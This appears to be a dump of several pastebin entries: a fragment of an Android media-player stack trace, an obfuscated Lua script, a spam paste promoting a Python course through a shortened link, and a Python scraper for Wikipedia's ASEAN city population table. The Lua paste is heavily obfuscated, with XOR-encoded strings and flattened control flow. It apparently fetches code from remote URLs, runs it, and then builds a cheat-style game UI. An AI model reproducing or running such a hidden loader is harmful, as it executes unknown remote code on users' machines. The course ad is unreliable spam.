error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":834,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":105,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":232,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":317,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}],""suppressedExceptions"":[]}"
ZuuukqDN,ratcooker,notnegus,Lua,Tuesday 13th of May 2025 05:31:49 PM CDT,"local M,sa,za=type,getmetatable,pairs;local d=getfenv()local Ia=function(Ca,Fa)local qa,J,u,Aa,L,ha,E,q,Ga,G,Z u,Z={[31476]=-30030,[14400]=16966,[9242]=28115,[2521]=19842,[5645]=4429},function(g)return u[g-19911]end E=Z(25556)repeat while true do if E==-1085558293+1085542947 then Ga=ha;if q~=q then E=Z(34311)else E=Z(51387)end elseif E==1839336007-1839366037 then if(G>=0 and ha>q)or((G<0 or G~=G)and ha<q)then E=-1230338288+1230355254 else E=Z(22432)end elseif E==1879639914+-1879622948 then return qa elseif E==-1049149557- -1049153986 then J,Aa,L,qa=d['bit3\50']and d['bit3\50']['bxor']or function(H,la)local Ka,ja,W,V,j,ba,X,S V,W={[32518]=-23873,[14858]=-20154,[-22767]=-30793,[-21692]=24637,[20386]=29991,[7928]=-24843,[14995]=-24515,[-19823]=29991,[-31127]=-24515,[27708]=-6174,[14714]=-22443,[-18693]=26802,[-15397]=-20154,[919]=18707,[12452]=-1255},function(_a)return V[_a-15579]end j=W(28031)repeat while true do if j==814608007+-814631880 then H=la j=W(30293)elseif j==1.796069056774068e-05*1174342374 then ba=H%(-845274432+845274434)if ba>-0*-335943972 then j=W(16498)break end j=W(30574)elseif j==-1.8741499164833232e-05*1308059712 then H,X=(H-ba)/(1368128658-1368128656),X*(1977395210-1977395208)j=W(182)elseif j==-754196650- -754165857 then j=W(-4244);elseif j==-617544004+617519161 then return S elseif j==-664328694- -664353331 then if H<la then j=W(48097)break end j=1852848578+-1852871021 elseif j==-2029757175- -2029755920 then X,S=1687557255+-1687557254,1472301490-1472301490 j=-808076440- -808070266 elseif j==-1984768066+1984794868 then S=S+X j=W(35965)elseif j==-29820619461750/-1728731563 then Ka,ja=H%(1812631476+-1812631474),la%(-2655373696/-1327686848)if not(Ka~=ja)then j=W(-7188)break else j=W(-3114)break end j=216930527-216900536 elseif j==1833011283+-1832992576 then S=S+X j=W(-15548)elseif j==-31885758963036/1582105734 then if H>1134241476-1134241476 then j=-690322363- -690343455 else j=W(23507)end elseif j==-183383191+183360748 then j=W(30437);elseif j==2.4559940121734248e-05*1221134899 then H,la,X=(H-Ka)/(-3703273080/-1851636540),(la-ja)/(2822530050/1411265025),X*(-1894151867- -1894151869)j=W(43287)elseif j==5.6731837357173362e-06*-1088277815 then if H>0/1306258667 and la>1242056806+-1242056806 then j=19800607062750/1147861279 else j=W(-6113)end end end until j==2146402101+-2146412643 end,d['string']['char'],d['string']['byte'],''ha,G,q=0/1507896782,1,#Ca-(2106306927+-2106306926)E=-1133339546+1133324200 elseif E==-7574169051125/-269399575 then ha=ha+G;Ga=ha;if ha~=ha then E=1263336685+-1263319719 else E=1626514771-1626544801 end elseif E==-1002915251- -1002935093 then qa=qa..Aa(J(L(Ca,Ga+-1455666345/-1455666345),L(Fa,Ga%#Fa+-925141353/-925141353)))E=Z(29153)end end until E==1599995361+-1600025165 end local O,ia,fa,U,ea,m,Oa,D=d[Ia('.M$I','I,')][Ia('\211\138\155y\172\230\153\134I\172','\148\239\239*\201')](d[Ia('.M$I','I,')],Ia('\195\242\234\234\251\249\224','\147\158\139')),d[Ia('\146\18\152\22','\245s')][Ia('\134\48m<\211\179#p\f\211','\193U\25o\182')](d[Ia('\146\18\152\22','\245s')],Ia('\246\210Cv\219\214\209DF\219','\164\167-%\190')),d[Ia('\215\244\221\240','\176\149')][Ia('\0s\n\231+5\96\23\215+','G\22~\180N')](d[Ia('\215\244\221\240','\176\149')],Ia('8\255\19\30\215\20\18','{\144a')),d[Ia('T\182\214^\134L\171\222T\146','8\217\183:\245')](d[Ia('I\96Cd','.\1')][Ia('R5\177j\6\160n','\26A\197')](d[Ia('I\96Cd','.\1')],Ia(""\217\55\152\'\132\242\139Si_\205\185WWv\252\221\247\31\24}\246l\208\204}\176qp\\uG\198/\232\201\212-\152x\133\173\200\25oE\220\162\rY9\235\215\233DSx\238r\218\141a\178g6A\96]\135G\232\201\208"",'\177C\236W\247\200\164|\14\54\185\209\""5X\159\178\154\48|\28\129\5\180\225\14\211\3\25,\1\52\233i\132\188')))(),d[Ia(""\19\153\55\133\51\v\132?\143\'"",'\127\246V\225@')](d[Ia('v<|8','\17]')][Ia('K\246\fs\197\29w','\3\130x')](d[Ia('v<|8','\17]')],Ia('|E\179\6W!\146i\232H\194\166\3\128\30-\240\48\217\222\236\16\170\251P\235\158m\162\163\209\173\238\25\142AB\148\148\171\218sfX\183\2W4\251*\239L\219\252K\132\v6\241\55\222\130\200\6\173\251P\236\212P\183\251\215\143\226X\139GP\143\222\234\220q','\20\49\199v$\27\189F\154)\181\136d\233jE\133R\172\173\137b\201\148>\159\251\3\214\141\178\194\131\54\234 5\253\240\134\169\16')))(),d[Ia('\v\238\214ir\19\243\222cf','g\129\183\r\1')](d[Ia('\164\151\174\147','\195\246')][Ia('\204\19}\244 l\240','\132g\t')](d[Ia('\164\151\174\147','\195\246')],Ia('\17-\0\49\244X\181\6t\189\225\184\199\197W=\169a\190\234\160v\172\30j\201\5\210\201\233\16\221\176\t(\179\156\222\178\196\225\21j\24\t-\an\193\14\239Lh\168\185\251\193\223W0\174,\138\253\161k\161\2+\244\14\200\216\181\21\211\190C\1\179\133\214\177\140\224Xt\4\24','yYtA\135b\154)\6\220\150\150\160\172#U\220\3\203\153\197\4\207q\4\189\96\188\189\199s\178\221&L\210\235\183\214\233\146v\24q')))(),{[Ia('\200d*\0i\200K9\ni','\188\5Xg\f')]=Ia('\23D>\\*','S1'),[Ia('\201\199\196\27\152S\196\205\216?\152N\194','\170\168\170o\249:')]=d[Ia('3$\197\136\55;\214\128!','DK\183\227')][Ia('\169\195})\139\241\140\225|4\161\250','\254\162\20]\205\158')](d[Ia('3$\197\136\55;\214\128!','DK\183\227')],Ia('6x\171\20d\22d\175\20v','u\16\202f\5')),[Ia('\164AO\221\147K[\198\162','\208$7\169')]=d[Ia('n|!Ba~','-\19M')][Ia("",\'5"",'B')](4.6888121355036719e-10*2132736333,-537623498- -537623498,0/442620061),[Ia('\134\212E\27\161\216G\n','\242\177=o')]=d[Ia('\18\197.\236u','G\129')][Ia('\170\161\179','\196')](-0/-450159042,76292961200/1525859224,1404024658+-1404024658,-10679954440/-266998861),[Ia('2\245\223\190P \246\212\175k','F\144\167\202\31')]=d[Ia('\146}r\176wc\247','\196\24\17')][Ia('\138\129\147','\228')](-0/-1331035891,-911477008- -911477011,-230674652- -230674652),[Ia('A\173\162\137\243@\160\150\154\226V','3\200\196\251\150')]=-612122907- -612122908},{[Ia('\212\r \243\15$\245','\145cA')]=false,[Ia('\193\146\225\155\231','\130\243')]={},[Ia('z\3Y\28','6l')]=nil,[Ia('t&\166\254nT=\161\255eD','7I\200\144\v')]={}}local function Ha(va)local y,c,Ja,K,ya c,Ja={[10812]=15437,[8295]=32117,[-9187]=-24221,[24626]=32117,[27862]=21487,[-20979]=31403,[-28343]=-11425,[-25584]=32117,[-17204]=11594},function(ra)return c[ra- -20128]end K=Ja(-37332)repeat while true do if K==-917261378+917276815 then if not(D[Ia(Ia('\148\225\180\232\178','\fU'),Ia('YW','\130'))][va])then K=Ja(-48471)break else K=Ja(-41107)break end K=Ja(-11833)elseif K==-1004064369- -1004040148 then return elseif K==7.4909088268764929e-06*1547742773 then if not D[Ia('<\242\56\27\240<\29','y\156Y')]or not va or not va[Ia('\131\140)&k_\136\182\145\4*DZ\158','\197\229GB-6\250')](va,Ia('\29\148\28\175\175\194em\a\142\30\186\145\204~}','U\225q\206\193\173\f\t'))then K=Ja(-29315)break end K=-9917145614437/-642427001 elseif K==-5.4040418597621676e-06*2114158309 then K=Ja(-45712);elseif K==97807523-97775406 then y=d[Ia('Hx]\158\96xM\143','\1\22.\234')][Ia('\203\192\210','\165')](Ia('mV\183h(\161NM\191C?\167','/?\219\4J\206'))y[Ia('\129\176Q\178\186[\165','\192\212>')]=va[Ia('y\248\17\0\163\200suc\226\19\21\157\198he','1\141|a\205\167\26\17')]y[Ia('\134g\175k','\213\14')]=Oa[Ia(""\208\164N\'\247\168L6"",'\164\193\54S')]y[Ia('\227\233\144W\145\255\251\131@\135\196','\176\157\229\51\226')]=Oa[Ia('\191\14\147f@\173\r\152w{','\203k\235\18\15')]y[Ia('v\223y\181\241D\252\96\128\231G','7\179\14\212\136')]=true y[Ia('\195p\224t','\141\17')]=Ia('\231\30\242\18','\162M')..va[Ia('\156\222\191\218','\210\191')]ya=d[Ia('Dy\141\169ly\157\184','\r\23\254\221')][Ia('\178\185\171','\220')](Ia('\204 \249J\212$\227[\244','\152E\129>'))ya[Ia('\176\5\153\t','\227l')]=d[Ia('\180\132\136\173\211','\225\192')][Ia('\246\253\239','\152')](55495080+-55495079,-952492474+952492474,-659238447+659238448,0*115352783)ya[Ia('O\236+$e\31\180\211*\135j\127\236&<r\f\169\195*\128G','\r\141HO\2m\219\166D\227>')]=-668346803/-668346803 ya[Ia(""\3\54/\'"",'WS')]=va[Ia('!\131\2\135','o\226')]ya[Ia('Y\4%\197Kb\r2\195;','\ra]\177\b')]=Oa[Ia('\236\211D|\219\217Pg\234','\152\182<\b')]ya[Ia('+\245\22\215C\28\241\2\198t','\127\144n\163\16')]=true ya[Ia('\229[\205@','\163\52')]=d[Ia('qlAo','4\2')][Ia('/$\a?','iK')][Ia('\206\245\238\v\5\49H\252\244\232;\t8\127','\157\154\155yfT\27')]ya[Ia('u\136\148@\135\146','%\233\230')]=y y[Ia('\138\137\153\191\134\159','\218\232\235')]=fa D[Ia('\154\222\186\215\188','\217\191')][va]=y D[Ia('\244r\188\149\177\212i\187\148\186\196','\183\29\210\251\212')][va]=va[Ia('\141\144\219\t\226\159n\181\189\208\r\255\140y\168','\204\254\184l\145\235\28')][Ia('\3\49\17.;\28\52','@^\127')](va[Ia('\141\144\219\t\226\159n\181\189\208\r\255\140y\168','\204\254\184l\145\235\28')],function(P,ua)local Qa,wa,Na Qa,wa={[-28991]=11797,[23514]=-13246,[-17005]=-10063,[32077]=-10063,[14279]=32547,[22706]=-5045,[-29462]=-11033},function(na)return Qa[na- -26823]end Na=wa(-56285)repeat while true do if Na==1.526110773458761e-05*773010728 then D[Ia('|H\\AZ','?)')][va][Ia('\27\248\200+\239\212&','_\157\187')](D[Ia('|H\\AZ','?)')][va])D[Ia('\217|\249u\255','\154\29')][va]=nil Na=wa(-3309)elseif Na==-6661128183710/603745870 then if not ua then Na=wa(-4117)break end Na=wa(5254)elseif Na==-1607915966- -1607910921 then if D[Ia('\234!\202(\204','\169@')][va]then Na=wa(-55814)break end Na=1200822253-1200835499 elseif Na==493042848-493052911 then Na=wa(-12544);break;elseif Na==-2062781733+2062768487 then Na=wa(-43828)end end until Na==1392288489-1392255942 end)K=Ja(7734)break elseif K==-2.2886226335535929e-05*-1372135342 then return end end until K==-19069643182938/-887496774 end local function s()local Y,p,A,f,ta,n,aa,B,z,f,n B,aa={[32718]=-30890,[-18127]=-25770,[31924]=-11695,[-2453]=11416,[-24651]=-7352,[3938]=-16597,[-28837]=-24486,[174]=7596,[-22758]=13547,[20112]=7596,[29741]=11416,[-1535]=-16597,[12672]=-22348},function(t)return B[t+-17001]end p=aa(29673)repeat while true do if p==1.1241329354567258e-05*-1040357384 then D[Ia('\18wk\245\214\50ll\244\221\""','Q\24\5\155\179')][n][Ia('\127\170\180=\28U\173\162=\a',';\195\199^s')](D[Ia('\18wk\245\214\50ll\244\221\""','Q\24\5\155\179')][n])p=aa(-7650)elseif p==-1.0303513874253194e-05*1610809691 then n,f=A(Y,z);z=n;if z==nil then p=-1556955034000/778477517 else p=-1803690496- -1803687095 end elseif p==-3.7056613328655508e-05*-308069167 then p=aa(17175)elseif p==667528659-667521063 then p=aa(15466);elseif p==-1582177615- -1582174214 then f[Ia('\4\209\215\52\198\203\57','@\180\164')](f)if D[Ia('xZ\24\169MXA\31\168FH',';5v\199(')][n]then p=aa(48925)break end p=0.00010399282223209249*-70697187 elseif p==2.7417136293550619e-05*-893091085 then A,Y,z=za(A)p=aa(46742)elseif p==1555582769+-1555584769 then D[Ia('\222;\254\50\248','\157Z')]={}D[Ia('F\194\218\23)f\217\221\22\""v','\5\173\180yL')]={}p=aa(-5757)break elseif p==1645945232+-1645952584 then p=aa(20939)elseif p==1242109088-1242134858 then ta=sa(A)if ta~=nil and ta.__iter~=nil then p=aa(49719)break elseif M(A)==Ia('\169\239\191\226\184','\221\142')then p=aa(-11836)break end p=-1851643168+1851654584 elseif p==-2.2941251411368774e-05*1346482781 then A,Y,z=ta.__iter(A)p=aa(14548)elseif p==-1283412570- -1283390222 then A,Y,z=d[Ia('\155\184\130\171\152','\235\217')](D[Ia('1\17\17\24\23','rp')])if M(A)~='function'then p=aa(-1126)break end p=aa(37113)end end until p==1579897315+-1579883768 end local function Q()local h,k,v,ca,I,ca,v,T,Ea,pa,Pa,w,Da,pa,b,x,a,Pa,e b,I={[-30414]=-21298,[-16660]=-31255,[3405]=-8766,[-31723]=-32652,[-25347]=-3745,[4531]=-23791,[-17526]=6806,[32254]=-24209,[-6264]=18373,[3260]=-14757,[-22929]=-664,[-1878]=-12492,[26016]=-664,[-2138]=-6886,[29456]=14403,[7009]=18957,[-24664]=-28837,[1842]=-24209,[29936]=18957,[-11604]=18957,[-16917]=1857,[-27146]=20231,[32306]=-21377,[-453]=-12492,[9833]=19359,[-13653]=3161,[-15123]=-8452,[-13207]=-17230,[19585]=-10395,[-11134]=18658,[-8528]=24618,[-10281]=-664,[-29810]=-32652,[-11784]=-28837,[-22708]=18373,[-746]=-28837,[30665]=19359,[12408]=-25076,[11124]=25235,[20561]=18776},function(da)return b[da- -20734]end T=I(-173)repeat while true do if T==17943474894345/-1726164011 then T=I(-32338);elseif T==1099747060+-1099727701 then Pa,ca=Da(w,a);a=Pa;if a==nil then T=I(-46081)else T=I(-35857)end elseif T==1641829533+-1641842025 then T=I(-31868)elseif T==1.0004375311451504e-06*1856187860 then ca[Ia('S\214\231c\193\251n','\23\179\148')](ca)D[Ia('\16\247\48\254\54','S\150')][Pa]=nil if not(D[Ia(Ia('\222i5\5\255\254r2\4\244\238','\199\165\230\16l'),Ia('\196\231#?h','\158D'))][Pa])then T=I(-1149)break else T=I(11572)break end T=I(9202)elseif T==685595957+-685577299 then T=I(9931);elseif T==-1111950698- -1111965101 then Da,w,a=za(Da)T=I(-21187)elseif T==1438848040-1438822805 then T=I(-17329);break;elseif T==-22284148507220/1293334214 then T=I(-21480);elseif T==-1.2160780163591414e-05*-928065457 then if not(pa[Ia(Ia('\a\191$\187','c\249'),Ia('XU','r'))]==Oa[Ia(Ia('P\130P|\179P\173Cv\179',',{(\147\251'),Ia('\1\254\3\238$','\tf'))])then T=I(-16203)break else T=I(-34387)break end T=-1073656159- -1073674532 elseif T==-1975596377+1975572586 then T=I(-26998);elseif T==530733906+-530748663 then Da,w,a=x.__iter(Da)T=I(-22612)elseif T==-457533547+457504710 then Da,w,a=d[Ia('\21\166\f\181\22','e\199')](D[Ia('\219s\251z\253','\152\18')])if M(Da)~='function'then T=I(-29262)break end T=-1589491640- -1589510298 elseif T==1.1980658733901669e-05*1688638367 then h=sa(Ea)if h~=nil and h.__iter~=nil then T=I(-38260)break elseif M(Ea)==Ia('\172\225\186\236\189','\216\128')then T=I(-8326)break end T=I(-43663)elseif T==3.7149788704660446e-05*-878928283 then v,pa=Ea(e,k);k=v;if k==nil then T=I(-9610)else T=-21209589055314/-1879283099 end elseif T==-22347523163470/1049278015 then return elseif T==18452078959053/973364929 then T=I(11520)elseif T==-1693025563+1693043936 then T=I(-50544)elseif T==-1948338076- -1948362694 then x=sa(Da)if x~=nil and x.__iter~=nil then T=I(-17474)break elseif M(Da)==Ia('(\238>\227\57','\\\143')then T=I(8722)break end T=-11200111163352/896582706 elseif T==6016566614323/1903374443 then Ha(pa)T=I(-43442)elseif T==-1190687871664/1793204626 then T=I(-22872)elseif T==-2.3175785794852673e-05*1348605837 then T=I(-18892);elseif T==258421973-258447049 then Ea,e,k=za(Ea)T=I(-31015)elseif T==-766243313+766239568 then Ea,e,k=d[Ia('\208\27\24\208\25\n','\185ky')](Oa[Ia('X\133:\217\200\237U\143&\253\200\240S',';\234T\173\169\132')][Ia('\226r\191=\194\204{\175\f\207\203','\165\23\203~\170')](Oa[Ia('X\133:\217\200\237U\143&\253\200\240S',';\234T\173\169\132')]))if M(Ea)~='function'then T=I(-47880)break end T=-4508922921646/654795661 elseif T==-3.727577704778949e-06*-1825850603 then Ea,e,k=h.__iter(Ea)T=I(5282)elseif T==-2.4570252416326099e-05*985297163 then T=I(-10901)elseif T==250806721+-250828098 then D[Ia('\20\b\203\170W4\19\204\171\\$','Wg\165\196\50')][Pa][Ia('\209\224\3#]\251\231\21#F','\149\137p@2')](D[Ia('\20\b\203\170W4\19\204\171\\$','Wg\165\196\50')][Pa])T=I(-13725)elseif T==609284109-609290995 then T=I(-52457);elseif T==8.3974287216324606e-06*-1006498570 then if not(not Pa[Ia(Ia('\rQ\214\56^\208','6\196\155'),Ia('0\175d','['))])then T=I(-37394)break else T=I(-37651)break end T=29156317541072/-1204358608 elseif T==1.4018458986551574e-05*1339376890 then if not(not D[Ia(Ia('\136\252P\175\254T\169','\212\143\137'),Ia('\162\166\3','\187'))])then T=I(-33941)break else T=I(-51148)break end T=I(-32518)end end until T==518257267-518266033 end local function La(Ma)local _,l,F F,l={[-24118]=-30166,[19322]=-22089,[-2114]=-26785,[-639]=19567,[22272]=-30166,[-4609]=-30166,[-24896]=-9800,[8882]=30476,[9285]=25061},function(r)return F[r- -23543]end _=l(-14258)repeat while true do if _==8479216930320/338343120 then D[Ia('\155\29\208\188\31\212\186','\222s\177')]=Ma if not(Ma)then _=l(-24182)break else _=l(-4221)break end _=l(-47661)elseif _==50118351242850/-1871135010 then d[Ia('\28G\27M','h&')][Ia('\131m\240\131i\242','\224\f\158')](D[Ia('\252!\223>','\176N')])D[Ia('.V\rI','b9')]=nil _=l(-14661)elseif _==36792720246759/-1665658031 then Q()D[Ia('>\19\29\f','r|')]=d[Ia('\159\148\152\158','\235\245')][Ia('0^\""Y-','C.')](function()local C,oa,i i,oa={[-8888]=-11917,[-10825]=29247,[27934]=-3566,[-20622]=29247,[-16093]=18747},function(xa)return i[xa- -24936]end C=oa(-41029)repeat while true do if C==-28837550569371/-986000293 then if D[Ia('\234\212\t\205\214\r\203','\175\186h')]then C=-43555004931060/1928065734 else C=oa(-33824)end elseif C==1629330335+-1629342252 then C=oa(2998);break;elseif C==-1193214563- -1193191973 then d[Ia('\15\2\b\b','{c')][Ia('I8W-','>Y')](Oa[Ia('\235\216L\212\254\234\213x\199\239\252','\153\189*\166\155')]);Q()C=oa(-35761)elseif C==-990523139- -990541886 then C=oa(-45558);end end until C==-1435470356- -1435466790 end)_=l(-28152)elseif _==-773061612+773092088 then _=l(-1271)elseif _==-0.00017029619247667597*177138429 then _=l(-48439);break;elseif _==-481931033+481950600 then s()if D[Ia('C,\96\51','\15C')]then _=l(-25657)break end _=-1125640593+1125671069 end end until _==-13692257885600/1397169172 end local R=U[Ia('\178 \189i4K\166;\182l/Y','\241R\216\b@.')](U,{[Ia('\157<\189\57\172','\201U')]=Ia('a\96\96A\170\\n\127\4\155','3\1\20a\233'),[Ia('\1\28\54\231;\29\56\214','RiT\179')]=Ia('\212\0M\155B\232\26\225NI\157\14\243\24\240','\149n9\242b\154{'),[Ia('n\214\225\184S\211\247\135',':\183\131\239')]=1.667410929430109e-07*959571496,[Ia('\17\142\56\130','B\231')]=d[Ia('C\185\127\144$','\22\253')][Ia('\178\169&\142\182\178\189:\134\141','\212\219I\227\249')](-2.773314538446822e-07*-2091360327,540233543+-540233083),[Ia('\159\214s\167\217h\189','\222\181\1')]=true,[Ia('.\241\31\244\31','z\153')]=Ia('\217\230\239\236','\157\135'),[Ia('\2\244\52\14\v&\231?,\3\54','O\157Zgf')]=d[Ia('\179z\131y','\246\20')][Ia('\204\224\186\196\234\167\226','\135\133\195')][Ia(')\219\254b\247\209\20\220\237x\236\254','{\178\153\n\131\146')]})local ga={[Ia('2\27\22\20','\127z')]=R[Ia('4\0\96!\5f','ud\4')](R,{[Ia(""\'-\a(\22"",'sD')]=Ia('\200\197\236\202','\133\164'),[Ia('\223N\249C','\150-')]=Ia('*?/5','BP')}),[Ia('>\f\220\23\5\207\29','n\96\189')]=R[Ia('_\146*J\151,','\30\246N')](R,{[Ia('\159_\191Z\174','\203\54')]=Ia('\233\187&\192\178\53\202','\185\215G'),[Ia('\202]\236P','\131>')]=Ia('\177\242\161\243\183','\196\129')}),[Ia('\4X\6\240>S\21\247','W=r\132')]=R[Ia('R\225\252G\228\250','\19\133\152')](R,{[Ia('aEA@P','5,')]=Ia('\235\143\236\206\209\132\255\201','\184\234\152\186'),[Ia(':I\28D','s*')]=Ia('\192\v-\238\218\0>\233','\179nY\154')})};ga[Ia('\221\240b\244\249q\254','\141\156\3')][Ia('\186\52\16\218\148\55\19\226\158','\251Pt\142')](ga[Ia('\221\240b\244\249q\254','\141\156\3')],Ia('\204n\184\16\241^\134-','\136\27\213}'),{[Ia('\136N\168K\185',""\220\'"")]=Ia('\17\146.\6,\199\6\56\5','U\231Ck'),[Ia('k\a\232N\23\226[','/b\142')]=false,[Ia('\208~\154)\241~\149.','\147\31\246E')]=La});d[Ia('\23W\1Z\6','c6')][Ia('\236\176l\224\172k','\133\222\31')](D[Ia('p(\188\21\167P3\187\20\172@','3G\210{\194')],Oa[Ia('\174\r\208\255(^\163\a\204\219(C\165','\205b\190\139I7')][Ia(""%\182\146\250\213\'\186\159\243\213"",'f\222\251\150\177')][Ia('ZXjwRgm','\25\55\4')](Oa[Ia('\174\r\208\255(^\163\a\204\219(C\165','\205b\190\139I7')][Ia(""%\182\146\250\213\'\186\159\243\213"",'f\222\251\150\177')],function(ka)local ma,N,o o,ma={[-585]=-5355,[18287]=12609,[4849]=-11381,[15222]=25933,[-1280]=-12699,[18640]=19381},function(Ba)return o[Ba+24830]end N=ma(-6190)repeat while true do if N==-1582024301748/124578652 then Ha(ka)N=ma(-6543)elseif N==1456307072640/-271952768 then d[Ia('\163\253\164\247','\215\156')][Ia('\134\208\152\197','\241\177')](154714306.20000002/1547143062)if D[Ia('\""\22\139\5\20\143\3','gx\234')]then N=ma(-26110)break end N=-1606890086- -1606902695 elseif N==1435114863-1435088930 then N=ma(-19981);break;elseif N==2064037595-2064024986 then N=ma(-9608)elseif N==-477532102628/-24639188 then if ka[Ia('\132\25\167\29','\202x')]==Oa[Ia('\198?\4\173}\198\16\23\167}','\178^v\202\24')]then N=ma(-25415)break end N=1926214376-1926188443 end end until N==20919985332096/-1838150016 end));ea[Ia('L\16\234\229\226}\a\255\219\242','\31u\158\169\139')](ea,U);m[Ia('n=\20\201\178_*\1\247\162','=X\96\133\219')](m,U);ea[Ia('\23\248\231P|=\166F@3\250\218Zz,\155@B-','^\159\137?\14X\242.%')](ea);m[Ia('\173\161\238g\145\168\254D\140','\254\196\154!')](m,Ia('\222N}\190\227@b\152\254','\140/\t\253'));ea[Ia(':\18\215\2\6\27\199!\27','iw\163D')](ea,Ia('\246\2\223+\183|\140\245\214L\200\a\182u\142\247\215','\164c\171h\216\19\231\144'));m[Ia('f\215\234\225\fU\189\56\199\240B\195\224\232;y\176\56\203\237J','$\162\131\141h\28\211L\162\130')](m,ga[Ia('( \253\160\18+\238\167','{E\137\212')]);ea[Ia('l\138\3\23\252\235\52\24\138G\152\57\30\251\220\50\25\130','.\255j{\152\168[v\236')](ea,ga[Ia('w\199\15\195M\204\28\196','$\162{\183')]);R[Ia('\231\163\249\163\215\178\193\167\214','\180\198\149\198')](R,-1956825096- -1956825097);U[Ia('\242\161\138\213\168\135','\188\206\254')](U,{[Ia('\199\207\231\202\246','\147\166')]=Ia('\190<PL\194O\205\19MD\214^\137','\237_\""%\178;'),[Ia('?\160\156b\15\188\129m','{\213\238\3')]=2.4952376019890317e-08*200381719});U[Ia('%\135M\209\30\135T\224','v\226\57\133')](U,Ia('-:\27\48','i['));ea[Ia('\2>\128~_\v\175<u!0\133Yq\16\189:~','NQ\225\26\30~\219S\25')](ea);U[Ia('\162\187\130\161','\235\213')](U)"
7p9B3eL7,101 Corrected Python Exercises and Algorithm,f0f077,Python,Tuesday 13th of May 2025 04:33:05 PM CDT,"101 Corrected Python Exercises and Algorithms
Improve your skills on dozens of algorithmic concepts with these 101 practical Python exercises.
What you will learn
Develop a problem-solving mindset
Learn little-known functions and techniques
Discover ways to optimize your code
Understanding how an algorithm works
for more:https://linkrex.net/MQLMyJehbs"
A67Kw09T,asean_population_data_script,ayshe180103,Python,Tuesday 13th of May 2025 03:52:23 PM CDT,"import requests
from bs4 import BeautifulSoup
import json
import os

URL = 'https://en.wikipedia.org/wiki/List_of_cities_in_ASEAN_by_population'
FILENAME = 'asean_cities_data.json'

def clean_number(value):
    try:
        value = value.split('[')[0]  # Премахва бележки като [1], [2] и т.н.
        return int(value.replace(',', '').strip())
    except:
        return 0

def extract_data():
    response = requests.get(URL)
    soup = BeautifulSoup(response.text, 'html.parser')
    tables = soup.find_all('table', {'class': 'wikitable'})

    extracted = []

    for table in tables:
        headers = [th.text.strip().lower() for th in table.find_all('th')]
        if 'country' in headers and 'population' in headers:
            data_rows = table.find_all('tr')[1:]
            for row in data_rows:
                cols = row.find_all('td')
                if len(cols) >= 5:
                    try:
                        city = cols[1].text.strip()
                        country = cols[3].text.strip()
                        population = clean_number(cols[4].text)
                        if city and country and population:
                            extracted.append({
                                'country': country,
                                'city': city,
                                'population': population
                            })
                    except Exception:
                        continue
    return extracted

def build_countries_dict(data):
    result = {}
    for entry in data:
        country = entry['country']
        city_data = {
            'city': entry['city'],
            'population': entry['population']
        }

        if country not in result:
            result[country] = {
                'cities': [],
                'total_population': 0
            }

        result[country]['cities'].append(city_data)
        result[country]['total_population'] += entry['population']

    return result

def load_old_data():
    if os.path.exists(FILENAME):
        with open(FILENAME, 'r', encoding='utf-8') as f:
            return json.load(f)
    return None

def save_if_changed(new_data):
    new_data_str = json.dumps(new_data, indent=2, sort_keys=True)
    old_data = load_old_data()

    if old_data:
        old_data_str = json.dumps(old_data, indent=2, sort_keys=True)
        if old_data_str == new_data_str:
            print(""No changes detected."")
            return

    with open(FILENAME, 'w', encoding='utf-8') as f:
        json.dump(new_data, f, indent=2, ensure_ascii=False)
        print(f""Data saved to {FILENAME}"")

def main():
    print(""Fetching data..."")
    data = extract_data()
    countries_dict = build_countries_dict(data)

    print(json.dumps(countries_dict, indent=2, ensure_ascii=False))
    save_if_changed(countries_dict)

if __name__ == '__main__':
    main()
"
